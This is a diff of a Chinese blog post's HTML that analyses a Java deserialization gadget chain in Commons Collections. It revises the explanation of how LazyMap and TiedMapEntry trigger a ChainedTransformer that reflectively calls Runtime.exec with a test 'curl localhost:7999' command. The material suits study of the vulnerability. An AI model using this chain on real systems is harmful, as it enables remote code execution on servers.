@@ -43,12 +43,13 @@
 <meta property="og:image" content="https://i.loli.net/2020/03/20/6BFx1jCGUwhLurD.png">
 <meta property="og:image" content="https://i.loli.net/2020/03/20/YaSQFePJ5GI8Z3T.png">
 <meta property="og:image" content="https://i.loli.net/2020/03/20/tHlV9euBORrL1WC.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/14/N7TzVPj2r4KantJ.png">
 <meta property="og:image" content="https://i.loli.net/2020/03/20/6R2oGnqILZNuzbT.png">
 <meta property="og:image" content="https://i.loli.net/2020/03/20/g7tNVwSLlIrYMx8.png">
 <meta property="og:image" content="https://i.loli.net/2020/03/20/BXMdYZnVcbf84sv.png">
 <meta property="og:image" content="https://i.loli.net/2020/03/20/n8XzoKLqhdeIW4f.png">
 <meta property="article:published_time" content="2020-03-20T03:00:55.000Z">
-<meta property="article:modified_time" content="2020-04-14T03:13:48.343Z">
+<meta property="article:modified_time" content="2020-04-14T07:05:52.389Z">
 <meta property="article:author" content="glotozz">
 <meta property="article:tag" content="java">
 <meta name="twitter:card" content="summary">
@@ -219,13 +220,14 @@
 <p>参考链接代码</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="comment">//传入Runtime类</span></span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="comment">//反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法</span></span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</span><br><span class="line">                    <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                    <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="comment">//反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象</span></span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                    <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                    <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="comment">//反射调用exec方法</span></span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                    <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                    <span class="keyword">new</span> Object[] &#123;<span class="string">"curl localhost:7999"</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>
 
-<p>但是还是需要调用一下<code>transform()</code>方法才能触发</p>
-<p>找到<code>TiedMapEntry</code>类的<code>toString()</code>方法，调用<code>getValue()</code>方法 </p>
+<p>但是还是需要调用一下<code>transform()</code>方法才能触发。 找到<code>LazyMap</code>类的<code>get</code>方法，发现里面调用了<code>factory</code>实例化的<code>transform</code>方法。</p>
+<p><img src="https://i.loli.net/2020/04/14/N7TzVPj2r4KantJ.png" alt="Snipaste_2020-04-14_14-58-14.png"></p>
+<p>全局搜索<code>get()</code>方法，找到<code>TiedMapEntry</code>类的<code>toString()</code>和<code>getValue()</code>方法 </p>
 <blockquote>
 <p>Java中的<code>toString</code>方法是和PHP中的<code>__toString</code>魔术方法有相同的作用的，当将这个对象当做字符串处理的时候会自动调用这个方法。 </p>
 </blockquote>
 <p><img src="https://i.loli.net/2020/03/20/6R2oGnqILZNuzbT.png" alt="Snipaste_2020-03-20_19-28-05.png"></p>
-<p> <code>getValue</code>方法调用了map实例的<code>get</code>方法 </p>
+<p><code>toString()</code>调用了<code>getValue()</code>， <code>getValue</code>方法调用了map实例的<code>get</code>方法 </p>
 <p>那么就可以构造了</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo"</span>);</span><br></pre></td></tr></table></figure>
 
